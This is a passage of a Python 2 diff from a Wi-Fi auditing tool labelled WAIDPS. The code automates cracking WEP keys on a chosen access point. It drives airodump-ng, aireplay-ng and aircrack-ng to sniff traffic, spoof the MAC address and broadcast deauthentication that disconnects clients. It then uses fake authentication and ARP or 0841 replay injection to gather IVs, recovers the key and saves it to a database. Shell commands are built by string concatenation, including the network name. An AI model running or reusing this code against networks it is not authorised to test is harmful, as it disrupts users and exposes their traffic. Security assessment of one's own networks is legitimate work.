+            sl=len(s)-3
+            print s,
+            sys.stdout.flush()
+            time.sleep(1)
+            t=t+1
+            s=""
+            ss="\r"
+            print "" + s.ljust(sl) + ss,
+            sys.stdout.flush()
+            if t>25:
+                usr_resp=AskQuestion(fcolor.BGreen + "Access point still not located, continue ?" + fcolor.BGreen,"y/N","U","N","1")
+                if usr_resp=="Y":
+                    NW=Now()
+                    t=1
+                else:
+                    LineBreak()
+                    KillSubProc(__builtin__.Sniffer)
+                    DelFile(FName + "*.*","")
+                    OptAuditing("")
+                    return;
+        CHECKFS=statinfo.st_size
+    DisplayAPDetail()
+    return
+    
+
+def AttackWEPProc(TargetMAC,TargetChannel,ClentList):
+    __builtin__.ATTACK_AP_PDATA=""
+    __builtin__.ATTACK_AP_PBEACON=""
+    TODEAUTH=0
+    TRY0841=0
+    TargetMAC2=str(TargetMAC).replace(":","")
+    printc ("i",fcolor.BBlue + "WEP Encryption Auditing","")
+    printc (" ",fcolor.SWhite + "Application will send broadcast deauthentication signal to all clients connected to the selected access point and also send targeted deauthentication signal between client and access point if any clients were found connected to the access point.","")
+    __builtin__.WEP_File=tmpdir + "WEP_" + str(TargetMAC2) + "_TMP-" + "*.cap"
+    os.chdir(tmpdir)
+    FName=tmpdir + "WEP_" + str(TargetMAC2) + "_TMP"
+    __builtin__.WEPKeyFile=FName + "_KEY.txt"
+    FFILE=[]
+    FFILE=glob.glob(__builtin__.WEP_File)
+    FFILE=sorted(FFILE,reverse=True)
+    __builtin__.ListNum="01"
+    ProcIDList=[]
+    if len(FFILE)>0:
+        LastFile=FFILE[0]
+        lFile=len(LastFile)
+        lFile=lFile-6
+        __builtin__.ListNum=LastFile[lFile:-4]
+        __builtin__.ListNum=int(__builtin__.ListNum)+1
+        __builtin__.ListNum=str(__builtin__.ListNum).zfill(2)
+        LEN_WEP_File=len(FFILE)
+        print ""
+        printc ("i",fcolor.BRed + "Total " + fcolor.BWhite + str(LEN_WEP_File) + fcolor.BRed + " previous captured dump were found. ","")
+        printc (" ",fcolor.SWhite + "Continuing with previous dump is useful as it will add on IVs that was previously found to the current one.","")
+        printc (" ",fcolor.SWhite + "PS - That is provided encryption key was not changed after the previous capture.\n","")
+        ListCapturedFile(TargetMAC2)
+        Qus=fcolor.BRed + "1" + fcolor.BGreen + " - New dump  " + fcolor.BRed + "2" + fcolor.BGreen + " - Continue previous dumps"
+        usr_resp=AskQuestion(Qus,"1/2 " + fcolor.SWhite + "Default-2","U","2","1")
+        if usr_resp!="2":
+            FFILE=[]
+            DelFile(FName + "*.*","")
+            DelFile(__builtin__.WEPKeyFile ,"")
+            __builtin__.ListNum="01"
+    else:
+        DelFile(FName + "*.*","")
+        DelFile(__builtin__.WEPKeyFile ,"")
+        __builtin__.ListNum="01"
+    if len(__builtin__.CUR_CLIENT)>0:
+        ListClientFound()
+    Result=ChangeMACAddr(__builtin__.SELECTED_ATK,"")
+    LineBreak()
+    __builtin__.TStart=Now()
+    printc ("i",fcolor.BGreen + "Time Start : " + fcolor.SWhite + str(__builtin__.TStart),"")
+    print ""
+    printc (".",fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Starting Sniffer for Access Point [ " + fcolor.SYellow +str(TargetMAC) + fcolor.SGreen + " ]..","")
+    cmdLine="xterm -geometry 100x20-0-200 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Sniffing Packet' -e 'airodump-ng --bssid " + TargetMAC  + " -c" + str(TargetChannel) + " -w " + FName + " " + str(__builtin__.SELECTED_ATK) + "'"
+    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+    __builtin__.Sniffer=ps.pid
+    ps=subprocess.Popen("iwconfig " + str(__builtin__.SELECTED_ATK) + " channel " + str(TargetChannel) + " > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+    ps.wait();ps.stdout.close()
+    WEP_CRACKED=""
+    WEP_AUTH=""
+    WEP_NOINJ=""
+    CHECKFS=""
+    PIVs2=0
+    __builtin__.WEP_ARPFILE=""
+    __builtin__.WEP_KOREK=""
+    __builtin__.WEP_FRAG=""
+    __builtin__.WEP_ARPFILELIST=[]
+    __builtin__.CapFile=FName + "-" + str(__builtin__.ListNum) + ".cap"
+    while WEP_CRACKED=="" and WEP_AUTH!="2":
+        LineBreak()
+        DisplayAPDetail()
+        t=0
+        retkey=""
+        if CHECKFS=="":
+            print ""
+            FS=0
+            NW=Now()
+            while FS<240:
+                if IsFileDirExist(FName + "-" + str(__builtin__.ListNum) + ".csv")=="F": 
+                    statinfo = os.stat(FName + "-" + str(__builtin__.ListNum) + ".csv")
+                    FS=statinfo.st_size
+                else:
+                    FS=0
+                PrintText=fcolor.BBlue + str(NW) + " - " +  "Locating Access Point [ " + fcolor.BYellow + __builtin__.ATTACK_AP_BSSID + fcolor.BBlue + " ] on Channel " + fcolor.BYellow + __builtin__.ATTACK_AP_CH + fcolor.BBlue + ", Please wait...."
+                bcolor=fcolor.SWhite
+                pcolor=fcolor.BGreen
+                tcolor=fcolor.SGreen
+                s=bcolor + "[" + pcolor + str(t) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + "\r"
+                sl=len(s)-3
+                print s,
+                sys.stdout.flush()
+                time.sleep(1)
+                t=t+1
+                s=""
+                ss="\r"
+                print "" + s.ljust(sl) + ss,
+                sys.stdout.flush()
+                if t>25:
+                    usr_resp=AskQuestion(fcolor.BGreen + "Access point still not located, continue ?" + fcolor.BGreen,"y/N","U","N","1")
+                    if usr_resp=="Y":
+                        NW=Now()
+                        t=1
+                    else:
+                        LineBreak()
+                        KillSubProc(__builtin__.Sniffer)
+                        DelFile(FName + "*.*","")
+                        OptAuditing("")
+                        return;
+            CHECKFS=statinfo.st_size
+        PIVs=0
+        Rate=0
+        RateR=0
+        PBeacon=0
+        ProcIDList=[]
+        while WEP_AUTH=="":
+            WEP_AUTH=Fake_Auth(TargetMAC,FName + "-" + str(__builtin__.ListNum) + ".csv")
+        ATTACK_TYPE="ARP Request Replay"
+        if WEP_AUTH=="1":
+            printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Auditing Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BPink + " ] using " + fcolor.BRed + str(ATTACK_TYPE) + fcolor.BPink + " methods ...","")
+            __builtin__.ProcID=WEPAttackMode("ARP_1",FName,"")
+            ProcIDList.append (str(__builtin__.ProcID))
+            __builtin__.ProcID=WEPAttackMode("CRACK_WEP",FName,"")
+        Rev=1
+        while WEP_AUTH=="1" and WEP_CRACKED=="":
+            Result=[]
+            NEWCLIENT=GetClientFromCSV (FName + "-" + str(__builtin__.ListNum) + ".csv")
+            if len(NEWCLIENT)>0:
+                __builtin__.CUR_CLIENT=__builtin__.NEW_CLIENT
+                ClentList=__builtin__.NEW_CLIENT
+                __builtin__.CUR_CLIENT_FS=__builtin__.NEW_CLIENT_FS
+                __builtin__.CUR_CLIENT_LS=__builtin__.NEW_CLIENT_LS
+                __builtin__.CUR_CLIENT_PWR=__builtin__.NEW_CLIENT_PWR
+                __builtin__.CUR_CLIENT_DATA=__builtin__.NEW_CLIENT_DATA
+                __builtin__.CUR_CLIENT_PROBE=__builtin__.NEW_CLIENT_PROBE
+            IVs=str(__builtin__.ATTACK_AP_DATA)
+            Beacon=str(__builtin__.ATTACK_AP_BEACON)
+            SRange=GetSignalRange(__builtin__.ATTACK_AP_PWR)
+            printl (tabspacefull + fcolor.SWhite + Now() + " - " + fcolor.SGreen + "Captured IVs " + fcolor.BGreen + str(IVs) + fcolor.SGreen + " [Rate " + fcolor.BGreen + str(Rate) + fcolor.SGreen + " IVs/Sec], Beacon : " + fcolor.BGreen + str(__builtin__.ATTACK_AP_BEACON) + fcolor.SGreen + ", AP Power : " + fcolor.BGreen + str(__builtin__.ATTACK_AP_PWR) + fcolor.SGreen + " dBm " + "(" + str (SRange) + fcolor.SGreen + ")" ,"0","")
+            cmdLine="ps -eo pid | grep '" + str(__builtin__.Sniffer) + "'"
+            ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE)	
+            readout=str(ps.stdout.read().replace("\n",""))
+            readout=str(readout).lstrip().rstrip()
+            ps.wait();ps.stdout.close()
+            if str(readout)=="" or readout!=str(__builtin__.Sniffer):
+                print "\n\n"
+                printc ("!", fcolor.BRed + "[Sniffer Stopped - Restarting]","")
+                RerunCapturedFile(TargetMAC,TargetChannel)
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_ARPRESULT.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_1.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_2.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_3.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_4A.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_4B.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_5.txt")
+            __builtin__.WEP_ARPFILE=CheckARPFile(str(FName) + "_REPLAY_6.txt")
+            while sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                usr_resp = sys.stdin.readline()
+                if usr_resp:
+                    print ""
+                    LineBreak()
+                    printc ("i",fcolor.BBlue + "Auditing Menu [WEP]","")
+                    DisplayAPDetail()
+                    MSG=""
+                    MSG=MSG + tabspacefull + fcolor.BRed + "1 " + fcolor.SWhite + " - Stop Auditing\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "2 " + fcolor.SWhite + " - Deauth All\n" 
+                    MSG=MSG + tabspacefull +fcolor.BRed + "3 " + fcolor.SWhite + " - List clients\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "4 " + fcolor.SWhite + " - Spoof MAC Address\n" 
+                    MSG=MSG + tabspacefull +fcolor.BRed + "5 " + fcolor.SWhite + " - Close all attacking terminal\n" 
+                    MSG=MSG + tabspacefull +fcolor.BRed + "6 " + fcolor.SWhite + " - List saved ARP replay files [ " + fcolor.SRed + str(len(__builtin__.WEP_ARPFILELIST)) + " files" + fcolor.SWhite + " ] \n" 
+                    MSG=MSG + tabspacefull +fcolor.BRed + "7 " + fcolor.SWhite + " - List all captured files  [ " + fcolor.SRed + str(len(FFILE)) + " files" + fcolor.SWhite + " ] \n" 
+                    MSG=MSG + tabspacefull + fcolor.BRed + "8 " + fcolor.SWhite + " - " + fcolor.BRed + "L" + fcolor.SWhite + "ookup Database History\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "F " + fcolor.BWhite + " - Authentication Method [1 - Fake Authentication]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     F1" + fcolor.SWhite + " - Fake Authentication (1 Time)\t\t\t" +fcolor.BRed + "F2" + fcolor.SWhite + " - Fake Authentication (Continous)\n"		# aireplay-ng -1 6000 -o 1 -q 10 -e ESSID -a BSSID -h ATMAC atmon0
+                    MSG=MSG + tabspacefull +fcolor.BRed + "I " + fcolor.BWhite + " - Attack Method [2 - Interactive Replay]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     I1" + fcolor.SWhite + " - Interactive Natural Replay *\t\t\t" +fcolor.BRed +"I2" + fcolor.SWhite + " - Interactive 0841 Replay (Modified)\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     I3" + fcolor.SWhite + " - Interactive 0841 Replay (Rebroadcast)\t\t" + fcolor.BRed + "I4" + fcolor.SWhite + " - Interactive 0841 Replay (68/86 ARP)\n"	# aireplay-ng -2 -b BSSID -c FF:FF:FF:FF:FF:FF -h ATMAC -p 0841 -m 68 -n 86 atmon0  # Need replay aireplay-ng -2 -b BSSID -h ATMAC -p 0841 -r replay_src-xxxx atmon0
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     I5" + fcolor.SWhite + " - Interactive 0841 Replay (Send Beacon)\t\t" +fcolor.BRed + "I6" + fcolor.SWhite + " - Interactive 0841 Replay (Clear-To-Send)\n"	# aireplay-ng -2 -b BSSID -h ATMAC -p 0841 -v 12 -u 1 -w 0  -m 10 - n 2000 
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     I7" + fcolor.SWhite + " - Interactive ARP Replay [ " + fcolor.SRed + str(len(__builtin__.WEP_ARPFILELIST)) + " files" + fcolor.SWhite + " ] \n" 	# aireplay-ng -2 -r WEP_ARPFILE atmon0
+                    MSG=MSG + tabspacefull +fcolor.BRed + "A " + fcolor.BWhite + " - Attack Method [3 - ARP Request]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     A1" + fcolor.SWhite + " - ARP Request Replay *\t\t\t\t" +fcolor.BRed + "A2" + fcolor.SWhite + " - ARP Request Replay (Existing ARP)\n"	# aireplay-ng -3 -b BSSID -h ATMAC - r WEP_ARPFILE atmon0
+                    MSG=MSG + tabspacefull +fcolor.BRed + "O " + fcolor.BBlack + " - Attack Method [4~7 Attack Method] - Not ready\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     O1" + fcolor.SBlack + " - KoreK Chopchop Attack\t\t\t\t" +fcolor.BRed + "O2" + fcolor.SBlack + " - Fragmentation Attack\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     O3" + fcolor.SBlack + " - Cafe-Latte Attack [Client-Oriented]\t\t" +fcolor.BRed + "O4" + fcolor.SBlack + " - Hirte Attack [Client-Oriented]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "C " + fcolor.BWhite + " - WEP Cracking Method\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     C1" + fcolor.SWhite + " - Standard Method  [All Bits]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     C2" + fcolor.SWhite + " - 10 Hex / 5 Char  [64  Bits]\t\t\t" +fcolor.BRed + "C3" + fcolor.SWhite + " - 26 Hex / 13 Char [128 Bits]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     C4" + fcolor.SWhite + " - 32 Hex / 16 Char [152 Bits]\t\t\t" +fcolor.BRed + "C5" + fcolor.SWhite + " - 58 Hex / 29 Char [256 Bits]\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     C6" + fcolor.SWhite + " - Korek Cracking Method\t\t\t\t" +fcolor.BRed + "C7" + fcolor.SWhite + " - Enable Last Keybyte Bruteforce\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "     C8" + fcolor.SWhite + " - Enable Last 2 Keybytes Bruteforce\t\t" +fcolor.BRed + "C9" + fcolor.SWhite + " - WEP-Decloak Mode\n"
+                    MSG=MSG + tabspacefull + fcolor.BRed + "9/R" + fcolor.SWhite + " - " + fcolor.BYellow + "R" + fcolor.SWhite + "estart Auditing\n"
+                    MSG=MSG + tabspacefull +fcolor.BRed + "0" + fcolor.SWhite + " - Return"
+                    print MSG
+                           
+                    usr_resp=AskQuestion("Select an option",fcolor.BRed + "0" + fcolor.BYellow + " - Return","U"," ","1")
+                if usr_resp!="0" or usr_resp=="Q":
+                    print ""
+                    if usr_resp=="1":
+                        LineBreak()
+                        DisplayComplete(__builtin__.TStart)
+                        KillSubProc(__builtin__.Sniffer)
+                        ShutDownAuditingWindows()
+                        print "";printc ("x","","")
+                        OptAuditing("")
+                        return;
+                    elif usr_resp=="8" or usr_resp=="L":
+                        OptInfoDisplay("","1")
+                    elif usr_resp=="2" or usr_resp=="D":
+                        LineBreak()
+                        DeauthBroadcast(__builtin__.ATTACK_AP_BSSID,__builtin__.SELECTED_ATK,5)
+                    elif usr_resp=="3" or usr_resp=="L":
+                        if len(__builtin__.CUR_CLIENT)>0:
+                            ListClientFound()
+                        else:
+                            printc ("!",fcolor.SRed + "No client found !!","")
+                            print "";printc ("x","","")
+                    elif usr_resp=="4" or usr_resp=="S":
+                        ListClientFound()
+                        Result=ChangeMACAddr(__builtin__.SELECTED_ATK,"")
+                        if Result!="":
+                            __builtin__.ProcID=WEPAttackMode("AAPC",FName,"1")
+                            print ""
+                            printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Auditing Access Point [ " + fcolor.BYellow +str(TargetMAC) + fcolor.BPink + " ] using " + fcolor.BRed + str(ATTACK_TYPE) + fcolor.BPink + " methods ...","")
+                            __builtin__.ProcID=WEPAttackMode("ARP_1",FName,"")
+                            ProcIDList.append (str(__builtin__.ProcID))
+                            __builtin__.ProcID=WEPAttackMode("0841_1",FName,"")
+                            ProcIDList.append (str(__builtin__.ProcID))
+                            TRY0841=1
+                    elif usr_resp=="5":
+                            printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Terminating all Auditing terminals...","")
+                            printc (" " , "                      " + fcolor.SRed + "Note :" + fcolor.SWhite + "You will need to launch new attacking mode in order to crack the WEP.","")
+                            Search="WAIDPS - Auditing"
+                            KillProc(Search)
+                    elif usr_resp=="6":
+                        DisplayARPFileList()
+                    elif usr_resp=="7":
+                        ListCapturedFile(TargetMAC2)
+                    elif usr_resp=="F1" or usr_resp=="F":
+                        __builtin__.ProcID=WEPAttackMode("AAP1",FName,"1")
+                    elif usr_resp=="F2":
+                        __builtin__.ProcID=WEPAttackMode("AAPC",FName,"1")
+                    elif usr_resp=="A1":
+                        __builtin__.ProcID=WEPAttackMode("ARP_1",FName,"1")
+                    elif usr_resp=="A2":
+                        __builtin__.ProcID=WEPAttackMode("ARP_2",FName,"1")
+                    elif usr_resp=="C": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP64",FName,"1")
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP128",FName,"1")
+                    elif usr_resp=="C1": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP",FName,"1")
+                    elif usr_resp=="C2": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP64",FName,"1")
+                    elif usr_resp=="C3": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP128",FName,"1")
+                    elif usr_resp=="C4": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP152",FName,"1")
+                    elif usr_resp=="C5": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEP256",FName,"1")
+                    elif usr_resp=="C6": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEPKorek",FName,"1")
+                    elif usr_resp=="C7": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEPX1",FName,"1")
+                    elif usr_resp=="C8": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEPX2",FName,"1")
+                    elif usr_resp=="C9": 
+                        __builtin__.ProcID=WEPAttackMode("CRACK_WEPDecloak",FName,"1")
+                    elif usr_resp=="IA": 
+                        TRY0841=1
+                        __builtin__.ProcID=WEPAttackMode("0841_1",FName,"1")
+                        __builtin__.ProcID=WEPAttackMode("0841_2",FName,"1")
+                        __builtin__.ProcID=WEPAttackMode("0841_3",FName,"1")
+                        __builtin__.ProcID=WEPAttackMode("0841_4",FName,"1")
+                        __builtin__.ProcID=WEPAttackMode("0841_5",FName,"1")
+                        __builtin__.ProcID=WEPAttackMode("0841_6",FName,"1")
+                    elif usr_resp=="I1": 
+                        __builtin__.ProcID=WEPAttackMode("0841_1",FName,"1")
+                        TRY0841=1
+                    elif usr_resp=="I2": 
+                        __builtin__.ProcID=WEPAttackMode("0841_2",FName,"1")
+                    elif usr_resp=="I3": 
+                        __builtin__.ProcID=WEPAttackMode("0841_3",FName,"1")
+                    elif usr_resp=="I4": 
+                        __builtin__.ProcID=WEPAttackMode("0841_4",FName,"1")
+                    elif usr_resp=="I5": 
+                        __builtin__.ProcID=WEPAttackMode("0841_5",FName,"1")
+                    elif usr_resp=="I6": 
+                        __builtin__.ProcID=WEPAttackMode("0841_6",FName,"1")
+                    elif usr_resp=="I7": 
+                        __builtin__.ProcID=WEPAttackMode("IA_ARP_REPLAY",FName,"1")
+                    elif usr_resp=="O3": 
+                        __builtin__.ProcID=WEPAttackMode("CAFE",FName,"1")
+                    elif usr_resp=="9" or usr_resp=="R":
+                        printc ("i", fcolor.BPink + "Restarting New Sniffer...","")
+                        RerunCapturedFile(TargetMAC,TargetChannel)
+                    LineBreak()
+                else:
+                    retkey=""
+            time.sleep(1)
+            if IsFileDirExist(str(__builtin__.WEPKeyFile))=="F":
+                WEP_CRACKED="1"
+            Rev += 1
+            if str(PIVs2)!=str(IVs):
+                Rate=int(IVs)-int(PIVs2)
+                if int(PIVs2)==0:
+                    Rate=0
+                PIVs2=str(IVs)
+            else:
+                RateR=RateR+1
+                if RateR==2:
+                    Rate=0;RateR=0
+                       
+                
+            if str(Rev)=="20":
+                Rev=0
+                if str(PIVs)!=str(IVs):
+                    PIVs=str(IVs)
+                    WEP_NOINJ=""
+                else:
+                    WEP_NOINJ="1"
+                    print ""
+                    printc (" " ,fcolor.SWhite + Now() + " - " + fcolor.SRed + "IVs does not seem to be increasing...you may want to try other method.." ,"")
+                    if TRY0841==0:
+                        TRY0841=1
+                        __builtin__.ProcID=WEPAttackMode("0841_1",FName,"1")
+                        ProcIDList.append (str(__builtin__.ProcID))
+                    TODEAUTH=TODEAUTH+1
+                    if TODEAUTH>5:
+                        TODEAUTH=0
+                        DeauthBroadcast(__builtin__.ATTACK_AP_BSSID,__builtin__.SELECTED_ATK,5)
+                if str(PBeacon)!=str(Beacon):
+                    PBeacon=str(Beacon)
+                    WEP_NOINJ=""
+                else:
+                    WEP_NOINJ="1"
+                    print ""
+                    printc (" " , fcolor.SWhite + Now() + " - " + fcolor.SRed + "Did not recieve any beacon from Access Point." ,"")
+                    printc (" " , "                      " + fcolor.SRed + "Is [WAIDPS - Sniffing Packet] terminal still open ?\n" ,"")
+                
+    x=0
+    KillSubProc(str(__builtin__.CrackProc))
+    KillSubProc(str(__builtin__.Sniffer))
+    while x<len(ProcIDList):
+        ProcID=ProcIDList[x]
+        KillSubProc(str(ProcID))
+        x += 1
+    ShutDownAuditingWindows()
+    if WEP_CRACKED=="1" and IsFileDirExist(str(__builtin__.WEPKeyFile))=="F":
+        ps=subprocess.Popen("cat " + str(__builtin__.WEPKeyFile), shell=True, stdout=subprocess.PIPE, stderr=open(os.devnull, 'w'))	
+        WEP_KEY=ps.stdout.read().replace("\n","").upper()
+        print "";print ""
+        printc ("i",fcolor.SWhite + Now() + " - " + fcolor.BBlue + "WEP Encryption for Access Point [ " + fcolor.BYellow +str(__builtin__.ATTACK_AP_BSSID) + fcolor.BBlue + " ] successfully cracked.. ","")
+        printc (" ","\t\t\t  - " + fcolor.BBlue + "WEP Key Found [ " + fcolor.BRed +str(WEP_KEY) + fcolor.BBlue + " ]","")
+        print ""
+        AddCrackDB(__builtin__.ATTACK_AP_BSSID,"WEP",WEP_KEY,__builtin__.ATTACK_AP_ESSID,"","")
+        DelFile(FName + "*.*","")
+        DelFile(tmpdir + "replay_arp-*.cap","")
+        DelFile(tmpdir + "replay_src-*.cap","")
+        LineBreak()
+    DisplayComplete(__builtin__.TStart)
+    LineBreak()
+    printc ("x","","")
+    OptAuditing("")
+
+def ListCapturedFile(TargetMAC2):
+    __builtin__.WEP_File=tmpdir + "WEP_" + str(TargetMAC2) + "_TMP-" + "*.cap"
+    printc ("i",fcolor.BBlue + "List of captured files.","")
+    os.chdir(tmpdir)
+    FName=tmpdir + "WEP_" + str(TargetMAC2) + "_TMP"
+    __builtin__.WEPKeyFile=FName + "_KEY.txt"
+    cl=0
+    fct=0
+    FFILE=[]
+    FFILE=glob.glob(__builtin__.WEP_File)
+    FFILE.sort()
+    if len(FFILE)>0:
+        while cl<len(FFILE):
+            GetFileDetail(FFILE[cl])
+            if int(__builtin__.FileSizeB)<200:
+                GoodBad="Bad"
+            else:
+                GoodBad=""
+            rlist=[]
+            PKT_TOTAL=0
+            PKT_WEP=0
+            PKT_WPA=0
+            PKT_CWEP=0
+            LPKT_TOTAL=""
+            LPKT_WEP=""
+            LPKT_WPA=""
+            LPKT_CWEP=""
+            cmd = ['airdecap-ng',FFILE[cl]] 
+            decap = Popen(cmd, stdout=PIPE, stderr=NULLOUT)
+            decap.wait()
+            readout=str(decap.stdout.read()).lower()
+            open(tmpdir + "tmp","w").write(readout)
+            with open(tmpdir + "tmp","r") as f:
+                for line in f:
+                    line=line.replace("\n","").replace("\x1b[k","")
+                    if str(line).find("number of packets read")!=-1:
+                        rlist=str(line).split(" ")
+                        PKT_TOTAL=str(rlist[len(rlist)-1])
+                        if str(PKT_TOTAL)!="":
+                            LPKT_TOTAL="Total : " + str(PKT_TOTAL) + " pkts,"
+                    if str(line).find("number of wep data packets")!=-1:
+                        rlist=str(line).split(" ")
+                        PKT_WEP=str(rlist[len(rlist)-1])
+                        if str(PKT_WEP)!="":
+                            LPKT_WEP="\tWEP : " + str(PKT_WEP) + " pkts, "
+                    if str(line).find("number of wpa data packets")!=-1:
+                        rlist=str(line).split(" ")
+                        PKT_WPA=str(rlist[len(rlist)-1])
+                        if str(PKT_WPA)!="" and str(PKT_WPA)!="0":
+                            LPKT_WPA="WPA : " + str(PKT_WPA) + " pkts, "
+                    if str(line).find("number of corrupted wep  packets")!=-1:
+                        rlist=str(line).split(" ")
+                        PKT_CWEP=str(rlist[len(rlist)-1])
+                        if str(PKT_CWEP)!="" and str(PKT_CWEP)!="0":
+                            LPKT_CWEP="Corrupted WEP : " + str(PKT_CWEP) + " pkts"
+                    LPKT=str(LPKT_TOTAL) + str(LPKT_WEP) + str(LPKT_WPA) + str(LPKT_CWEP)
+                    if LPKT[-2:]==", ":
+                        LPKT=LPKT[:-2]
+            FName=str(FFILE[cl]).replace(tmpdir,"")
+            printc(" ",fcolor.SGreen + str(FName) + "\t" + fcolor.SWhite + str(__builtin__.FileModified) + "\t" + str(__builtin__.FileSize).ljust(15) + str(LPKT), "")
+            fct = fct + 1
+            cl = cl+1
+        print ""
+        DelFile (tmpdir + "tmp","")
+        DelFile (tmpdir + "WEP_" + str(TargetMAC2) + "_TMP-*-dec.cap","")
+        printc ("i",fcolor.BWhite + "Total " + fcolor.BRed + str(fct) + fcolor.BWhite + " file(s) listed.","")
+    else:
+        printc ("!",fcolor.SRed + "No captured file found !!","")
+        print "";
+        printc ("x","","")
+
+def WEPAttackMode(Mode,FName,ToDisplay):
+    ARPFileUse=""
+    if str(__builtin__.ATTACK_AP_ESSID)!="":
+        AddESSID="-e \x22" + str(__builtin__.ATTACK_AP_ESSID) + "\x22 "
+    else:
+        AddESSID=""
+    WEPAttack=""
+    WEP_METHOD=""
+    if Mode=="AAP1":
+        if ToDisplay=="1":
+            printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Single Associating with Access Point [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BPink + " ]...","")
+        cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Associating Access Point (Single)' -e 'aireplay-ng -1 0 -a " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(AddESSID) + str(__builtin__.SELECTED_ATK) + "'"
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+        ProcIDList=[]
+        __builtin__.ProcID=ps.pid
+    if Mode=="AAPC":
+        if ToDisplay=="1":
+            printc (".",fcolor.SWhite + Now() + " - " + fcolor.BPink + "Sending keep-alive packet to Access Point [ " + fcolor.BYellow + str(__builtin__.ATTACK_AP_BSSID) + fcolor.BPink + " ]...","")
+        cmdLine="xterm -geometry 100x5-0-150 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Associating Access Point (Keep Alive)' -e 'aireplay-ng -1 6000 -o 1 -q 10 -a " + str(__builtin__.ATTACK_AP_BSSID)  + " -h " + str(__builtin__.SELECTED_ATK_MAC) + " " + str(AddESSID) + str(__builtin__.SELECTED_ATK) + "'"
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'),preexec_fn=os.setsid)		
+        ProcIDList=[]
+        __builtin__.ProcID=ps.pid
+    if Mode=="CRACK_WEP":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP' -e 'aircrack-ng -a 1 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEP64":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [64Bit]' -e 'aircrack-ng -a 1 -n 64 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEP128":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [128Bit]' -e 'aircrack-ng -a 1 -n 128 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEP152":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
+        cmdLine="xterm -geometry 100x20-0-0 -iconic -bg black -fg white -fn 5x8 -title 'WAIDPS - Cracking WEP [152Bit]' -e 'aircrack-ng -a 1 -n 152 -l " + str(__builtin__.WEPKeyFile) + " " + str(__builtin__.WEP_File) + "'"
+    if Mode=="CRACK_WEP256":
+        WEPAttack="2"
+        WEP_METHOD="Launching WEP Cracker" 
